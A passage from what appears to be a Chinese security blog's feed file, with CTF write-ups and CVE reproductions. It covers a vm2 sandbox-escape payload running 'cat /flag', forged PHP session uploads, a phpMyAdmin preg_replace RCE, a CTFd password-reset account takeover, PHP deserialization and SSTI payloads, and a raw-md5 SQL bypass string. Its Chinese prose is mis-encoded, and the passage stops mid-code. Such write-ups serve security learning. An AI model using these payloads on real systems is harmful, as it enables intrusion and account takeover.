rel="noopener">https://github.com/patriksimek/vm2/issues/225</a> </p><p>payload:</p><pre><code class="javascript">const axios = require(&#39;axios&#39;)const untrusted = &#39;(&#39; + function(){    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try{        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    }catch(e){        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();    }}+&#39;)()&#39;;const content = Buffer.from(untrusted).toString(&#39;hex&#39;)axios.get(&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;).then(p =&gt; {    console.log(p.data)}).catch(p =&gt; {    console.log((p.response.data))})</code></pre><h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?phperror_reporting(0);session_save_path(&quot;/var/babyctf/&quot;);session_start();require_once &quot;/flag&quot;;highlight_file(__FILE__);if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;){    $filename=&#39;/var/babyctf/success.txt&#39;;    if(file_exists($filename)){            safe_delete($filename);            die($flag);    }}else{    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;}$direction = filter_input(INPUT_POST, &#39;direction&#39;);$attr = filter_input(INPUT_POST, &#39;attr&#39;);$dir_path = &quot;/var/babyctf/&quot;.$attr;if($attr===&quot;private&quot;){    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];}if($direction === &quot;upload&quot;){    try{        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){            throw new RuntimeException(&#39;invalid upload&#39;);        }        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){            throw new RuntimeException(&#39;invalid file path&#39;);        }        @mkdir($dir_path, 0700, TRUE);        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){            $upload_result = &quot;uploaded&quot;;        }else{            throw new RuntimeException(&#39;error while saving&#39;);        }    } catch (RuntimeException $e) {        $upload_result = $e-&gt;getMessage();    }} elseif ($direction === &quot;download&quot;) {    try{        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));        $file_path = $dir_path.&quot;/&quot;.$filename;        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){            throw new RuntimeException(&#39;invalid file path&#39;);        }        if(!file_exists($file_path)) {            throw new RuntimeException(&#39;file not exist&#39;);        }        header(&#39;Content-Type: application/force-download&#39;);        header(&#39;Content-Length: &#39;.filesize($file_path));        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);        if(readfile($file_path)){            $download_result = &quot;downloaded&quot;;        }else{            throw new RuntimeException(&#39;error while saving&#39;);        }    } catch (RuntimeException $e) {        $download_result = $e-&gt;getMessage();    }    exit;}?&gt;</code></pre><p>å› ä¸ºä¸Šä¼ ç›®å½•å’Œsessæ–‡ä»¶æ‰€åœ¨ç›®å½•ç›¸åŒï¼Œå¯ä»¥ä¼ªé€ sess</p><pre><code>POST / HTTP/1.1Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.comContent-Length: 395Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtmUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;Connection: close------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;direction&quot;upload------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;attr&quot;------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;Content-Type: text/plain\x08usernames:5:&quot;admin&quot;;------WebKitFormBoundaryx5uJpSmC7ijBPrtm--</code></pre><p>æˆåŠŸä¼ªé€ adminèº«ä»½</p><p>æ¥ä¸‹æ¥å°±æ˜¯è¦å¼„ä¸ªsuccess.txtäº†ï¼Œè™½ç„¶æˆ‘ä»¬æ–‡ä»¶åä¼šè¢«åŠ ä¸ªåç¼€</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»º<code>success.txt</code>æ–‡ä»¶å¤¹æ¥è¾¾åˆ°ç›¸åŒæ•ˆæœ</p><pre><code class="php">POST / HTTP/1.1Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.comContent-Length: 406Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtmUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffdConnection: close------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;direction&quot;upload------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;attr&quot;success.txt------WebKitFormBoundaryx5uJpSmC7ijBPrtmContent-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;Content-Type: text/plainusernames:5:&quot;admin&quot;;------WebKitFormBoundaryx5uJpSmC7ijBPrtm--</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/20/2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-è™ç¬¦ç½‘ç»œå®‰å…¨/">http://blog.ccreater.top/2020/04/20/2020æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›-è™ç¬¦ç½‘ç»œå®‰å…¨/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin_ç™»é™†å_rce</title>
      <link href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/"/>
      <url>/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/</url>
      
        <content type="html"><![CDATA[<h1 id="phpmyadminç™»é™†årce"><a href="#phpmyadminç™»é™†årce" class="headerlink" title="phpmyadminç™»é™†årce"></a>phpmyadminç™»é™†årce</h1><h2 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h2><blockquote><p>åœ¨PHP5.4.7ä»¥å‰ï¼Œ<code>preg_replace</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥åˆ©ç”¨\0è¿›è¡Œæˆªæ–­ï¼Œå¹¶å°†æ­£åˆ™æ¨¡å¼ä¿®æ”¹ä¸ºeã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œeæ¨¡å¼çš„æ­£åˆ™æ”¯æŒæ‰§è¡Œä»£ç ï¼Œæ­¤æ—¶å°†å¯æ„é€ ä¸€ä¸ªä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>ä»¥ä¸‹ç‰ˆæœ¬å—åˆ°å½±å“ï¼š</p><ul><li>4.0.10.16ä¹‹å‰4.0.xç‰ˆæœ¬</li><li>4.4.15.7ä¹‹å‰4.4.xç‰ˆæœ¬</li><li>4.6.3ä¹‹å‰4.6.xç‰ˆæœ¬ï¼ˆå®é™…ä¸Šç”±äºè¯¥ç‰ˆæœ¬è¦æ±‚PHP5.5+ï¼Œæ‰€ä»¥æ— æ³•å¤ç°æœ¬æ¼æ´ï¼‰</li></ul></blockquote><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å…¨å±€æœç´¢preg_replace,å‘ç°ä»¥ä¸‹å¯èƒ½æœ‰å¯æ§å˜é‡çš„ä½ç½®:</p><p>å®¹æ˜“æ‰¾åˆ°</p><p><code>TableSearch.lib.php</code></p><pre><code class="php">function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)    {        $column = $this-&gt;_columnNames[$columnIndex];        $sql_query = &quot;SELECT &quot;            . PMA_Util::backquote($column) . &quot;,&quot;            . &quot; 1,&quot; // to add an extra column that will have replaced value            . &quot; COUNT(*)&quot;            . &quot; FROM &quot; . PMA_Util::backquote($this-&gt;_db)            . &quot;.&quot; . PMA_Util::backquote($this-&gt;_table)            . &quot; WHERE &quot; . PMA_Util::backquote($column)            . &quot; RLIKE &#39;&quot; . PMA_Util::sqlAddSlashes($find) . &quot;&#39; COLLATE &quot;            . $charSet . &quot;_bin&quot;; // here we            // change the collation of the 2nd operand to a case sensitive            // binary collation to make sure that the comparison is case sensitive        $sql_query .= &quot; GROUP BY &quot; . PMA_Util::backquote($column)            . &quot; ORDER BY &quot; . PMA_Util::backquote($column) . &quot; ASC&quot;;        $result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($sql_query, 0);        if (is_array($result)) {            foreach ($result as $index=&gt;$row) {                $result[$index][1] = preg_replace(                    &quot;/&quot; . $find . &quot;/&quot;,                    $replaceWith,                    $row[0]                );            }        }        return $result;    }</code></pre><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$resultå’Œ$replaceWith</code>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p><p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p><p>æˆ‘ä»¬å…ˆçœ‹<code>getReplacePreview</code></p><p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p><p>å†æŸ¥çœ‹è°ƒç”¨<code>getReplacePreview</code>çš„å‡½æ•°</p><p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p><p>å»çœ‹ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜æ˜¾ä¸è¡Œ,è¿™é‡Œå°±ä¸è´´å‡ºæ¥äº†</p><p>å†è·Ÿè¿›<code>tbl_find_replace.php</code></p><pre><code class="php">if (isset($_POST[&#39;find&#39;])) {    $preview = $table_search-&gt;getReplacePreview(        $_POST[&#39;columnIndex&#39;],        $_POST[&#39;find&#39;],        $_POST[&#39;replaceWith&#39;],        $_POST[&#39;useRegex&#39;],        $connectionCharSet    );    $response-&gt;addJSON(&#39;preview&#39;, $preview);    exit;}</code></pre><p>æ˜æ˜¾ç™½ç»™</p><p>æˆ‘ä»¬å†å›åˆ°<code>_getRegexReplaceRows</code>å»æŸ¥çœ‹å®ƒçš„ç¬¬äºŒä¸ªè°ƒç”¨å‡½æ•°</p><p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p><p>å†æŸ¥çœ‹è°ƒç”¨replaceçš„å‡½æ•°</p><p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p><p>åŒæ ·åé¢ä¸¤ä¸ªè¿˜æ˜¯ä¸è¡Œ</p><p>åœ¨è·Ÿè¿›<code>tbl_find_replace.php</code></p><p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p><p>è¿˜æ˜¯ç™½ç»™,ä¸¤ä¸ªè°ƒç”¨é“¾éƒ½æ˜¯å¯ä»¥rceçš„,æˆ‘ä»¬ä»¥å‰é¢é‚£ä¸ªä¸ºä¾‹</p><p>å…ˆå¾€è¡¨ä¸­æ·»åŠ ä¸€æ¡æ•°æ®<code>INSERT INTO</code>flags<code>(</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p><p>ç›´æ¥æŠ“åŒ…,ä¿®æ”¹</p><p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p><p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p><p>æˆåŠŸ</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>è¿™ä¸ªpocç›´æ¥æŠ„ä¸ªåˆ«äººçš„,æ‡’å¾—å†™äº†</p><p><code>https://www.exploit-db.com/exploits/40185</code></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/03/phpmyadmin_ç™»é™†å_rce/">http://blog.ccreater.top/2020/04/03/phpmyadmin_ç™»é™†å_rce/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFdä»»æ„å¯†ç é‡ç½®å¤ç°</title>
      <link href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFdä»»æ„å¯†ç é‡ç½®å¤ç°"><a href="#CTFdä»»æ„å¯†ç é‡ç½®å¤ç°" class="headerlink" title="CTFdä»»æ„å¯†ç é‡ç½®å¤ç°"></a>CTFdä»»æ„å¯†ç é‡ç½®å¤ç°</h1><p>ä»Šå¤©åˆšå¥½åšåˆ°ä¸€é¢˜CTFdçš„å°±é¡ºä¾¿å¤ç°ä¸‹</p><p>è¿™æ˜¯è¡¥ä¸çš„ä¿¡æ¯:<code>Strip spaces on registration and refine password reset</code></p><p>æ ¹æ®è¡¥ä¸ä¿¡æ¯å»æ‰¾registerçš„ä»£ç </p><pre><code class="python">def register():    errors = get_errors()    if request.method == &quot;POST&quot;:        name = request.form[&quot;name&quot;]        email_address = request.form[&quot;email&quot;]        password = request.form[&quot;password&quot;]        name_len = len(name) == 0        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()        emails = (            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)            .filter_by(email=email_address)            .first()        )        pass_short = len(password.strip()) == 0        pass_long = len(password) &gt; 128        valid_email = validators.validate_email(request.form[&quot;email&quot;])        team_name_email_check = validators.validate_email(name)        if not valid_email:            errors.append(&quot;Please enter a valid email address&quot;)        if email.check_email_is_whitelisted(email_address) is False:            errors.append(                &quot;Only email addresses under {domains} may register&quot;.format(                    domains=get_config(&quot;domain_whitelist&quot;)                )            )        if names:            errors.append(&quot;That user name is already taken&quot;)        if team_name_email_check is True:            errors.append(&quot;Your user name cannot be an email address&quot;)        if emails:            errors.append(&quot;That email has already been used&quot;)        if pass_short:            errors.append(&quot;Pick a longer password&quot;)        if pass_long:            errors.append(&quot;Pick a shorter password&quot;)        if name_len:            errors.append(&quot;Pick a longer user name&quot;)        if len(errors) &gt; 0:            return render_template(                &quot;register.html&quot;,                errors=errors,                name=request.form[&quot;name&quot;],                email=request.form[&quot;email&quot;],                password=request.form[&quot;password&quot;],            )        else:            with app.app_context():                user = Users(                    name=name.strip(),                    email=email_address.lower(),                    password=password.strip(),                )                db.session.add(user)                db.session.commit()                db.session.flush()                login_user(user)                if config.can_send_mail() and get_config(                    &quot;verify_emails&quot;                ):  # Confirming users is enabled and we can send email.                    log(                        &quot;registrations&quot;,                        format=&quot;[{date}] {ip} - {name} registered (UNCONFIRMED) with {email}&quot;,                    )                    email.verify_email_address(user.email)                    db.session.close()                    return redirect(url_for(&quot;auth.confirm&quot;))                else:  # Don&#39;t care about confirming users                    if (                        config.can_send_mail()                    ):  # We want to notify the user that they have registered.                        email.sendmail(                            request.form[&quot;email&quot;],                            &quot;You&#39;ve successfully registered for {}&quot;.format(                                get_config(&quot;ctf_name&quot;)                            ),                        )        log(&quot;registrations&quot;, &quot;[{date}] {ip} - {name} registered with {email}&quot;)        db.session.close()        if is_teams_mode():            return redirect(url_for(&quot;teams.private&quot;))        return redirect(url_for(&quot;challenges.listing&quot;))    else:        return render_template(&quot;register.html&quot;, errors=errors)</code></pre><p>é˜…è¯»ä»£ç å‘ç°,æŸ¥è¯¢ç”¨æˆ·åæ˜¯å¦é‡å¤æ˜¯ç›´æ¥å°†æˆ‘ä»¬çš„è¾“å…¥æ‹¿å»æŸ¥è¯¢</p><pre><code class="python">        name = request.form[&quot;name&quot;]        email_address = request.form[&quot;email&quot;]        password = request.form[&quot;password&quot;]        name_len = len(name) == 0        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()#è¿™é‡Œè¿™é‡Œ        emails = (            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)            .filter_by(email=email_address)            .first()        )        if names:            errors.append(&quot;That user name is already taken&quot;)</code></pre><p>è€ŒéªŒè¯æ²¡æœ‰é‡å¤å,åˆ™å°†æˆ‘ä»¬è¾“å…¥çš„ç”¨æˆ·åstripå,åœ¨æ·»åŠ åˆ°æ•°æ®åº“,ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨æ•°æ®åº“å¼„å¤šä¸ªåŒåè´¦å·</p><pre><code class="python">            user = Users(                    name=name.strip(),                    email=email_address.lower(),                    password=password.strip(),                )</code></pre><p>CTFdé‡ç½®å¯†ç ä¼šæ”¶åˆ°è¿™æ ·çš„email</p><pre><code>Did you initiate a password reset? Click the following link to reset your password:http://f04e02df-7759-45ba-a2b2-b89399e91ca0.node3.buuoj.cn/reset_password/ImFkbWluIg.XoRn7w.CDy8yi95cLlHsZN_YRiCp9Z-mX4</code></pre><p>æˆ‘ä»¬å»æ‰¾<code>/reset_password/&lt;xxx&gt;</code>çš„è·¯ç”±</p><pre><code class="python">@auth.route(&quot;/reset_password&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])@auth.route(&quot;/reset_password/&lt;data&gt;&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])@ratelimit(method=&quot;POST&quot;, limit=10, interval=60)def reset_password(data=None):    if data is not None:        try:            name = unserialize(data, max_age=1800)        except (BadTimeSignature, SignatureExpired):            return render_template(                &quot;reset_password.html&quot;, errors=[&quot;Your link has expired&quot;]            )        except (BadSignature, TypeError, base64.binascii.Error):            return render_template(                &quot;reset_password.html&quot;, errors=[&quot;Your reset token is invalid&quot;]            )        if request.method == &quot;GET&quot;:            return render_template(&quot;reset_password.html&quot;, mode=&quot;set&quot;)        if request.method == &quot;POST&quot;:            user = Users.query.filter_by(name=name).first_or_404()            user.password = request.form[&quot;password&quot;].strip()            db.session.commit()            log(                &quot;logins&quot;,                format=&quot;[{date}] {ip} -  successful password reset for {name}&quot;,                name=name,            )            db.session.close()            return redirect(url_for(&quot;auth.login&quot;))</code></pre><p>æˆ‘ä»¬å‘ç°,é‡ç½®å¯†ç æ˜¯æ ¹æ®ç”¨æˆ·åæŸ¥å‡ºçš„ç¬¬ä¸€ä¸ªè®°å½•è¿›è¡Œä¿®æ”¹<code>user = Users.query.filter_by(name=name).first_or_404()</code></p><p>è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸè¦†ç›–äº†ä¹‹å‰çœŸå®ç”¨æˆ·çš„å¯†ç è€Œä¸æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/04/01/CTFdä»»æ„å¯†ç é‡ç½®å¤ç°/">http://blog.ccreater.top/2020/04/01/CTFdä»»æ„å¯†ç é‡ç½®å¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3æœˆåšé¢˜</title>
      <link href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/"/>
      <url>/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="3æœˆåšé¢˜"><a href="#3æœˆåšé¢˜" class="headerlink" title="3æœˆåšé¢˜"></a>3æœˆåšé¢˜</h1><h2 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><pre><code class="php">&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));}</code></pre><pre><code class="php">function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}extract($_POST);$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);$serialize_info = filter(serialize($_SESSION));$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre><p>æˆ‘ä»¬åˆ©ç”¨filteræ¥åæ‰ä¸€äº›å­—ç¬¦,ä»è€Œè®©æˆ‘ä»¬ä»»æ„ååºåˆ—åŒ–</p><p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></p><p>æˆ‘ä»¬åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªpayload:</p><p>â€¦</p><p>åœ¨phpinfoä¸­æ‰¾åˆ°</p><table><thead><tr><th>config</th><th>Local Value</th><th>Mastr Value</th></tr></thead><tbody><tr><td>auto_append_file</td><td>d0g3_f1ag.php</td><td>d0g3_f1ag.php</td></tr></tbody></table><pre><code>_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></pre><pre><code class="php">&lt;?php$flag = &#39;flag in /d0g3_fllllllag&#39;;?&gt;</code></pre><p><code>flag{62b16099-c29d-499a-9dde-e54bf2985b31}</code></p><h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>md5($var,true)ä¼šè¿”å›ä¸€ä¸ªåŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®ï¼ŒæŸäº›æ•°æ®ä¼šè¢«å½“æˆå­—ç¬¦ä¸²</p><blockquote><p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(åŸå§‹å€¼ä¼šåŒ…å«mysqlä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤å¾ˆå±é™©ï¼‰ã€‚</p></blockquote><p>   ç‰¹æ®Šå­—ç¬¦ä¸²:</p><blockquote><p>129581926211651571912466741651878684928<br>ffifdyop</p></blockquote><h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#39;yds&#39;;foreach($_POST as $x =&gt; $y){    $$x = $y;}foreach($_GET as $x =&gt; $y){    $$x = $$y;}#$x=handsome $y=flagforeach($_GET as $x =&gt; $y){    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){        exit($handsome);    }}if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){    exit($yds);}if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){    exit($is);}echo &quot;the flag is: &quot;.$flag;</code></pre><p><code>/index.php?yds=flag</code></p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>æ ¹æ®é¢˜ç›®çš„æç¤º,ä¿®æ”¹xffå¤´,å‘ç°å¯ä»¥ä¿®æ”¹ip,ä½†æ˜¯ä¿®æ”¹æˆ127.0.0.1åæ²¡æœ‰å•¥ä¸œè¥¿</p><p>åæ¥åœ¨fuzzçš„è¿‡ç¨‹ä¸­å‘ç°,æœ‰sstiæ¼æ´</p><pre><code>GET /flag.php HTTP/1.1Host: node3.buuoj.cn:27223Upgrade-Insecure-Requests: 1X-Forwarded-For: {system(&#39;cat /flag&#39;)}User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://node3.buuoj.cn:27223/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0Connection: close</code></pre><h2 id="ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><pre><code class="php">&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = 